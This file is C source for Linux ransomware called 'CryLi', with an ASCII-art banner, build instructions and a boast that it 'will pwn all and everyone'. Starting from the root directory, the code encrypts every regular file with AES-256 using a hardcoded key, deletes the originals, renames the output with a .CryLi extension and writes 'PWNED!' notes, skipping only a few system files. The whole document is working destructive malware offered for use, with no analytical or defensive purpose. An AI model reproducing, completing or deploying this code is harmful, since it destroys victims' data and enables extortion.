/*
ROOT VERSION!
 ######  ########  ##    ## ##       #### 
##    ## ##     ##  ##  ##  ##        ##  
##       ##     ##   ####   ##        ##  
##       ########     ##    ##        ##  
##       ##   ##      ##    ##        ##  
##    ## ##    ##     ##    ##        ##  
 ######  ##     ##    ##    ######## #### 

CryLi Linux ransomeware will pwn all and everyone

CryLi uses openssl creating a 256bit encryption key then encrypting all files
libssl-dev && openssl-dev are needed 

gcc Cryli.c -lcrypto -o Cryli

            .-""-.
           / .--. \
          / /    \ \
          | |    | |
          | |.-""-.|
         ///`.::::.`\
        ||| ::/  \:: ;
        ||; ::\__/:: ;
         \\\ '::::' /
          `=':-..-'`
*/

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <openssl/aes.h>


void ls_dir(char* start_path);
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv);


int main()
{
   
	
	char* start_path;
	start_path = "/";
    ls_dir(start_path);

    return 0;

}

void ls_dir(char* start_path)
{
	unsigned char key[] = "12345678901234561234567890123456"; // 32 char 256bit key
    unsigned char iv[] = "1234567890123456"; //same size as block 16 char 128 bit block

	DIR* dir;
	struct dirent *ent;
	if((dir=opendir(start_path)) !=NULL)
	{
		while((ent=readdir(dir)) !=NULL)
		{
			int len = strlen(ent->d_name);
			const char* last_four = &ent->d_name[len-4];
			if(strcmp(last_four,".CryLi") != 0)
			{
				if(ent->d_type == 8)
				{
					char* full_path_readme =(char*) malloc(strlen("README")+strlen(start_path)+2);
					strcpy(full_path_readme,start_path);
					strcat(full_path_readme,"README");
					char* full_path =(char*) malloc(strlen(ent->d_name)+strlen(start_path)+2);
					strcpy(full_path,start_path);
					strcat(full_path,ent->d_name);
					char* new_name = (char*) malloc(strlen(full_path)+strlen(".CryLi")+1);
					strcpy(new_name,full_path);
					strcat(new_name,".CryLi");
					if(strcmp(full_path,"/etc/passwd") !=0 && strcmp(full_path,"/etc/shadow")!=0 && strcmp(full_path,"/etc/sudoers") !=0)
					{
						FILE* fpin;
						FILE* fpout;
						FILE* fpreadme;
					
						
						fpin=fopen(full_path,"rb");
						fpout=fopen(new_name,"wb");
						fpreadme=fopen(full_path_readme,"w");
						
						fprintf(fpreadme,"PWNED!\n");
						fclose(fpreadme);
						
						encryptfile(fpin,fpout,key,iv);

						fclose(fpin);
						fclose(fpout);
						remove(full_path);
					}
					free(full_path);
					free(new_name);
				}
				else if(ent->d_type==4)
				{

					char *full_path=(char*) malloc(strlen(start_path)+strlen(ent->d_name)+2);
					strcpy(full_path,start_path);
					strcat(full_path,ent->d_name);
					strcat(full_path,"/");
					printf("%s\n",full_path);
					if(full_path != start_path && ent->d_name[0] != '.')
					{
						ls_dir(full_path);
					}
					
					free(full_path);

				}

			}
		}
	}

}
void encryptfile(FILE * fpin,FILE* fpout,unsigned char* key, unsigned char* iv)
{

	
	const unsigned bufsize = 4096;
	unsigned char* read_buf = malloc(bufsize);
	unsigned char* cipher_buf ;
	unsigned blocksize;
	int out_len;

	EVP_CIPHER_CTX ctx;

	EVP_CipherInit(&ctx,EVP_aes_256_cbc(),key,iv,1);
	blocksize = EVP_CIPHER_CTX_block_size(&ctx);
	cipher_buf = malloc(bufsize+blocksize);

	while(1)
	{
		int bytes_read = fread(read_buf,sizeof(unsigned char),bufsize,fpin);
		EVP_CipherUpdate(&ctx,cipher_buf,&out_len,read_buf, bytes_read);
		fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);
		if(bytes_read < bufsize)
		{
			break;
		}
	}

	EVP_CipherFinal(&ctx,cipher_buf,&out_len);
	fwrite(cipher_buf,sizeof(unsigned char),out_len,fpout);

	free(cipher_buf);
	free(read_buf);
}